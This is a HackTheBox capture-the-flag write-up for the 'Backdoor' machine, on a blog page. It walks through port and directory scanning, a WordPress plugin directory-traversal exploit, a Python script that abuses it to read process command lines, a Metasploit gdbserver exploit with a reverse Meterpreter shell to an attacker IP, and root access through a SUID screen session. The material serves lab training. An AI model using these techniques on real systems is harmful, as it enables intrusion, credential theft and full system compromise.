<!DOCTYPE html><html lang="en" dir="auto"><head><meta charset="utf-8"/><meta http-equiv="x-ua-compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><meta name="robots" content="index, follow"/><title>HackTheBox Writeup: Backdoor | Zebra</title><meta name="keywords" content="cybersecurity,ctf,linux,hackthebox"/><meta name="description" content="In this machine I learned the common attack vectors in Wordpress. Also to inspect the `proc` filesystem for running processes."/><meta name="author" content="Zebra"/><link rel="canonical" href="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><link crossorigin="anonymous" href="/assets/css/stylesheet.523aabfa2b5ee217ac92d035cb44bf463d5d30a14b08f7aa59ccfdbebf4501f8.css" integrity="sha256-Ujqr+ite4hesktA1y0S/Rj1dMKFLCPeqWcz9vr9FAfg=" rel="preload stylesheet" as="style"/><script defer="" crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload="hljs.initHighlightingOnLoad()"></script>
<link rel="icon" href="https://xzebra.dev/images/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="https://xzebra.dev/images/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="https://xzebra.dev/images/favicon-32x32.png"/><link rel="apple-touch-icon" href="https://xzebra.dev/images/apple-touch-icon.png"/><link rel="mask-icon" href="https://xzebra.dev/safari-pinned-tab.svg"/><meta name="msapplication-TileColor" content="#2e2e33"/><link rel="alternate" hreflang="en" href="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox Writeup: Backdoor"/><meta property="og:description" content="In this machine I learned the common attack vectors in Wordpress. Also to inspect the `proc` filesystem for running processes."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><meta property="og:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_UAlerjv.png"/><meta property="article:section" content="blog"/><meta property="article:published_time" content="2021-11-21T13:11:00+07:00"/><meta property="article:modified_time" content="2023-05-13T11:15:00+07:00"/><meta property="og:site_name" content="Zebra"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_shibboleth/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_UAlerjv.png"/><meta name="twitter:title" content="HackTheBox Writeup: Backdoor"/><meta name="twitter:description" content="In this machine I learned the common attack vectors in Wordpress. Also to inspect the `proc` filesystem for running processes."/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://xzebra.dev/blog/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeup: Backdoor","item":"https://xzebra.dev/blog/hackthebox_writeup_backdoor/"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: Backdoor","name":"HackTheBox Writeup: Backdoor","description":"In this machine I learned the common attack vectors in Wordpress. Also to inspect the `proc` filesystem for running processes.","keywords":["cybersecurity","ctf","linux","hackthebox"],"articleBody":"Enumeration sudo nmap -p- -sV 10.129.103.13 Starting Nmap 7.92 ( ) at 2021-11-21 00:36 EET Nmap scan report for backdoor.htb (10.129.103.13) Host is up (0.065s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 1337/tcp open waste? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at . Nmap done: 1 IP address (1 host up) scanned in 230.73 seconds There is a weird 1337 port that can be used by any application. We can try to netcat to it, but we get no response.\nIf we scan the website, we see it is a Wordpress blog. The page doesn’t have much content so we might have to scan the Wordpress dirs.\nWe can list files in wp-content/uploads, but there is not much there. I also did a scan with wpscan (but seems to be a useless tool):\nwpscan --api-token XXXX --url I then ran a gobuster scan only for Wordpress folders, and found the plugins folder (/wp-content/plugins/) can be listed.\ngobuster -w /usr/share/dirbuster/cms/wordpress.fuzz.txt dir -b 404,302 --exclude-length 0 --url =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/cms/wordpress.fuzz.txt [+] Negative Status codes: 302,404 [+] Exclude Length: 0 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/11/21 13:58:02 Starting gobuster in directory enumeration mode =============================================================== /wp-admin/admin-footer.php (Status: 200) [Size: 2] /readme.html (Status: 200) [Size: 7346] /license.txt (Status: 200) [Size: 19915] /wp-admin/admin-ajax.php (Status: 400) [Size: 1] /wp-admin/css/ (Status: 200) [Size: 22220] /wp-admin/edit-form-comment.php (Status: 200) [Size: 2] /wp-admin/edit-link-form.php (Status: 200) [Size: 2] /wp-admin/edit-tag-form.php (Status: 200) [Size: 2] /wp-admin/images/ (Status: 200) [Size: 16710] /wp-admin/includes/ (Status: 200) [Size: 24762] /wp-admin/edit-form-advanced.php (Status: 200) [Size: 2] /wp-admin/js/ (Status: 200) [Size: 20773] [ /wp-admin/install.php (Status: 200) [Size: 1275] /wp-admin/maint/ (Status: 200) [Size: 967] /wp-admin/maint/repair.php (Status: 200) [Size: 1640] /wp-admin/setup-config.php (Status: 500) [Size: 2686] /wp-admin/upgrade.php (Status: 200) [Size: 1245] /wp-content/plugins/akismet/admin.php (Status: 403) [Size: 277] /wp-content/plugins/akismet/index.php (Status: 403) [Size: 277] /wp-content/plugins/akismet/legacy.php (Status: 403) [Size: 277] /wp-content/plugins/akismet/readme.txt (Status: 403) [Size: 277] /wp-content/plugins/akismet/widget.php (Status: 403) [Size: 277] /wp-content/plugins/ (Status: 200) [Size: 1185] /wp-content/plugins/akismet/ (Status: 403) [Size: 277] /wp-includes/ (Status: 200) [Size: 52159] /wp-includes/css/ (Status: 200) [Size: 9205] ... /wp-includes/ms-files.php (Status: 200) [Size: 29] /wp-includes/pomo/ (Status: 200) [Size: 1987] /wp-includes/SimplePie/Cache/ (Status: 200) [Size: 2202] /wp-includes/SimplePie/ (Status: 200) [Size: 6368] /wp-includes/SimplePie/Content/ (Status: 200) [Size: 999] /wp-includes/SimplePie/Content/Type/ (Status: 200) [Size: 1030] /wp-includes/SimplePie/Decode/ (Status: 200) [Size: 997] /wp-includes/SimplePie/Decode/HTML/ (Status: 200) [Size: 1029] /wp-includes/SimplePie/HTTP/ (Status: 200) [Size: 1004] /wp-includes/SimplePie/Parse/ (Status: 200) [Size: 1002] /wp-includes/SimplePie/Net/ (Status: 200) [Size: 998] /wp-includes/SimplePie/XML/Declaration/ (Status: 200) [Size: 1030] /wp-includes/SimplePie/XML/ (Status: 200) [Size: 1005] /wp-includes/Text/ (Status: 200) [Size: 1160] /wp-includes/Text/Diff/ (Status: 200) [Size: 1385] /wp-includes/Text/Diff/Engine/ (Status: 200) [Size: 1607] /wp-includes/Text/Diff/Renderer/ (Status: 200) [Size: 1012] /wp-includes/theme-compat/ (Status: 200) [Size: 2646] /wp-includes/wlwmanifest.xml (Status: 200) [Size: 1045] /wp-links-opml.php (Status: 200) [Size: 223] /wp-mail.php (Status: 403) [Size: 2616] /wp-login.php (Status: 200) [Size: 5674] /xmlrpc.php (Status: 405) [Size: 42] /wp-trackback.php (Status: 200) [Size: 135] =============================================================== 2021/11/21 13:58:13 Finished =============================================================== If we list the plugins, we see the following:\n[DIR]\tebook-download/\t2021-11-10 14:18\t- [ ]\thello.php\t2019-03-18 17:19\t2.5K There is a hello.php file and an ebook-download plugin.\nGetting the foothold We can access /wp-content/plugins/ebook-download/readme.txt to check the plugin’s version, which is 1.1 (Stable tag: 1.1). If we google a bit about this, we can find a vulnerability for that version.\nOffSec’s Exploit Database Archive WordPress Plugin eBook Download 1.1 - Directory Traversal.. webapps exploit for PHP platform https://www.exploit-db.com/exploits/39575 According to the exploit, we can traverse the directories and access any file in the system:\ncurl '' And we will get the wp-config.php. We can see some passwords and seeds, but none of those help us get into wp-admin.\nAfter a lot of time trying to get into wp-admin (I even tried to perform a dictionary attack with wpxploit), I decided to investigate more the port 1337 (maybe that’s why the machine is named backdoor).\nWe don’t have a reverse shell yet, so we can’t just show the used ports and the processes. Wait… we actually can but in an uncommon way: the proc filesystem.\nThe proc filesystem shows processes info, which can help us find which process is using the 1337 port. In order to do that, we will need to scan all the PIDs (as we don’t know which one to look at), so I will be using a python script for that.\nAt first I tried to test the /proc/PID/net/tcp file of each process, but it seems like it is a shared file (it has the same content of /proc/net/tcp). In this file we can see the used ports in hexadecimal (00000000:0539 -\u003e 0.0.0.0:1337):\nsl local_address rem_address st tx_queue rx_queue tr tm-\u003ewhen retrnsmt uid timeout inode 0: 0100007F:8124 00000000:0000 0A 00000000:00000000 00:00000000 00000000 113 0 35896 1 0000000000000000 100 0 0 10 0 1: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000 113 0 35898 1 0000000000000000 100 0 0 10 0 2: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000 101 0 33011 1 0000000000000000 100 0 0 10 0 3: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 33687 1 0000000000000000 100 0 0 10 0 4: 00000000:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000 1000 0 195237 1 0000000000000000 100 0 0 10 0 5: 0D67810A:BAE8 01010101:0035 02 00000001:00000000 01:000000D6 00000002 101 0 271782 2 0000000000000000 400 0 0 1 7 Then, I tried scanning all the /proc/PID/fd/number to check which process had that port used, but without any result.\nI ended up checking the cmdline file to show the command executed to run the process, and filtered the ones which contained the port (as we usually run the cli applications with the address as parameter).\nimport requests # curl '' baseUrl = '' # Clear the results (some weird output from ebook-download) def req(file): x = requests.get(f\"{baseUrl}{file}\") req_text = x.text filtered_req = req_text.lstrip(check_file).rstrip('') return filtered_req for pid in range(0, 50000): check_file = f\"/proc/{pid}/cmdline\" res = req(check_file) if res != \"\": if \"1337\" in res: print(f\"Found possible process {pid} with cmd:\") print(res) After running it, we get the following result:\nFound possible process 956 with cmd: bin/sh-cwhile true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done Getting the user flag It is a gdbserver. It is known that you can run host commands through some debugging tools, such as the python or php ones. So I googled about this and found the following exploit:\nTurning arbitrary GDBserver sessions into RCE | Development \u0026 Security http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/ It shows a shellcode that can be injected through gdb to get a reverse shell. Although, there is a metasploit for performing this exploit, so I won’t be covering the steps to do it manually.\nGDB Server Remote Payload Execution Rapid7's VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities. https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/ I configured it like this:\nmsf exploit(gdb_server_exec) \u003e show options Module options (exploit/multi/gdb/gdb_server_exec): Name Current Setting Required Description ---- --------------- -------- ----------- EXE_FILE /bin/true no The exe to spawn when gdbserver is not attached to a process. RHOSTS backdoor.htb yes The target host(s), see rk/wiki/Using-Metasploit RPORT 1337 yes The target port (TCP) Payload options (linux/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.187 yes The listen address (an interface may be specified) LPORT 6666 yes The listen port Exploit target: Id Name -- ---- 1 x86_64 (64-bit) msf exploit(gdb_server_exec) \u003e exploit After running it, we get a meterpreter shell, which can be converted into a normal one using the shell command:\nmeterpreter \u003e shell Process 7509 created. Channel 1 created. id uid=1000(user) gid=1000(user) groups=1000(user) python3 -c 'import pty; pty.spawn(\"/bin/bash\")' user@Backdoor:~$ user@Backdoor:~$ export TERM=xterm And we can get the user flag!\nPrivilege escalation After some enumeration, I listed all the files with the suid bit activated.\nuser@Backdoor:~$ find / -type f -perm -u=s 2\u003e/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/bin/passwd /usr/bin/chfn /usr/bin/gpasswd /usr/bin/at /usr/bin/su /usr/bin/sudo /usr/bin/newgrp /usr/bin/fusermount /usr/bin/screen /usr/bin/umount /usr/bin/mount /usr/bin/chsh /usr/bin/pkexec We can see there is a screen executable, which is owned by root.\n-rwsr-xr-x 1 root root 474280 Feb 23 2021 /usr/bin/screen screen is like a terminal multiplexer. We can see the sessions listed in the folder /run/screen:\nuser@Backdoor:~$ ls /run/screen S-root S-user And it seems like root is running its own. You can easily connect to a user with screen -x youruser/. So we can run it with root (as the suid bit is activated):\nscreen -x root/ root@Backdoor:~# id id uid=0(root) gid=0(root) groups=0(root) and get a root shell. Now you can get the root flag!\nConclusion Getting the foothold in this machine was quite frustrating for me. I never did a Wordpress pentest, but it makes a lot of sense to pay attention to the plugins, as Wordpress is developed by a bigger company and it is easier for a plugin developer to introduce a bug.\nAlso, I was lucky with the proc method, because most of the ports are configured nowadays with env or config files. To be honest, I wouldn’t consider the user easy. Although, the root was pretty straitforward if you looked for what you had to look for.\nReferences Important Wordpress files Page not found - HackTricks https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#basic-information wpxploit (Directory Attack credentials) GitHub - relarizky/wpxploit: Simple Python Script For Performing XMLRPC Dictionary Attack Simple Python Script For Performing XMLRPC Dictionary Attack - relarizky/wpxploit https://github.com/relarizky/wpxploit proc filesystem Page Not Found | MIT - Massachusetts Institute of Technology https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/ch-proc.html Remote Code Execution in gdbserver Turning arbitrary GDBserver sessions into RCE | Development \u0026 Security http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/ ","wordCount":"1581","inLanguage":"en","image":"https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_UAlerjv.png","datePublished":"2021-11-21T13:11:00+07:00","dateModified":"2023-05-13T11:15:00+07:00","author":{"@type":"Person","name":"Zebra"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xzebra.dev/blog/hackthebox_writeup_backdoor/"},"publisher":{"@type":"Organization","name":"Zebra","logo":{"@type":"ImageObject","url":"https://xzebra.dev/images/favicon.ico"}}}</script></head><body id="top"><header class="header"><nav class="nav"><ul id="menu" style="margin-left:auto"><li><a href="https://xzebra.dev/" title="whoami"><span>whoami</span></a></li><li><a href="https://xzebra.dev/blog/" title="blog"><span>blog</span></a></li><li><a href="https://xzebra.dev/apps/" title="apps"><span>apps</span></a></li></ul></nav></header><main class="main"><article class="post-single"><header class="post-header"><h1 class="post-title">HackTheBox Writeup: Backdoor</h1><div><ul class="post-series"><span class="secondary-text">This post belongs to this series:</span><li><a rel="noopener noreferrer" href="https://xzebra.dev/series/hackthebox/" class="link-highlight" style="--highlight-color:#9fef00">HackTheBox Machines</a></li></ul></div><div class="post-description">In this machine I learned the common attack vectors in Wordpress. Also to inspect the <code>proc</code> filesystem for running processes.</div><div class="post-meta"><span title="2021-11-21 13:11:00 +0700 +0700">November 21, 2021</span> · 8 min · Zebra</div></header><figure class="entry-cover"><img loading="lazy" src="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_UAlerjv.png" alt=""/></figure><div class="post-content"><h1 id="enumeration">Enumeration<a hidden="" class="anchor" aria-hidden="true" href="#enumeration">#</a></h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sudo nmap -p- -sV 10.129.103.13
</span></span><span style="display:flex"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> &lt;https://nmap.org&gt; <span style="color:#f92672">)</span> at 2021-11-21 00:36 EET
</span></span><span style="display:flex"><span>Nmap scan report <span style="color:#66d9ef">for</span> backdoor.htb <span style="color:#f92672">(</span>10.129.103.13<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>Host is up <span style="color:#f92672">(</span>0.065s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex"><span>1337/tcp open  waste?
</span></span><span style="display:flex"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
</span></span><span style="display:flex"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 230.73 seconds
</span></span></code></pre></div><p>There is a weird 1337 port that can be used by any application. We can try to
netcat to it, but we get no response.</p><p>If we scan the website, we see it is a <em>Wordpress</em> blog. The page doesn’t have
much content so we might have to scan the Wordpress dirs.</p><p>We can list files in <code>wp-content/uploads</code>, but there is not much there. I also did
a scan with <code>wpscan</code> (but seems to be a useless tool):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>wpscan --api-token XXXX --url &lt;http://backdoor.htb&gt;
</span></span></code></pre></div><p>I then ran a <code>gobuster</code> scan only for <em>Wordpress</em> folders, and found the plugins
folder (<code>/wp-content/plugins/</code>) can be listed.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>gobuster -w /usr/share/dirbuster/cms/wordpress.fuzz.txt dir -b 404,302 --exclude-length <span style="color:#ae81ff">0</span> --url &lt;http://backdoor.htb&gt;
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>Gobuster v3.1.0
</span></span><span style="display:flex"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     &lt;http://backdoor.htb&gt;
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/dirbuster/cms/wordpress.fuzz.txt
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   302,404
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exclude Length:          <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>2021/11/21 13:58:02 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>/wp-admin/admin-footer.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/readme.html          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7346<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/license.txt          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 19915<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/admin-ajax.php <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/css/        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 22220<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/edit-form-comment.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/edit-link-form.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/edit-tag-form.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/images/     <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16710<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/includes/   <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 24762<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/edit-form-advanced.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/js/         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 20773<span style="color:#f92672">]</span>       <span style="color:#f92672">[</span>
</span></span><span style="display:flex"><span>/wp-admin/install.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1275<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/maint/      <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 967<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/maint/repair.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1640<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/setup-config.php <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2686<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-admin/upgrade.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1245<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-content/plugins/akismet/admin.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-content/plugins/akismet/index.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-content/plugins/akismet/legacy.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-content/plugins/akismet/readme.txt <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-content/plugins/akismet/widget.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-content/plugins/  <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1185<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-content/plugins/akismet/ <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 52159<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/css/     <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 9205<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>...
</span></span><span style="display:flex"><span>/wp-includes/ms-files.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 29<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/pomo/    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1987<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/Cache/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2202<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6368<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/Content/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 999<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/Content/Type/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1030<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/Decode/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 997<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/Decode/HTML/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1029<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/HTTP/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1004<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/Parse/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1002<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/Net/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 998<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/XML/Declaration/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1030<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/SimplePie/XML/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1005<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/Text/    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1160<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/wp-includes/Text/Diff/ <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1385<span style="color:#f92672">]</span>
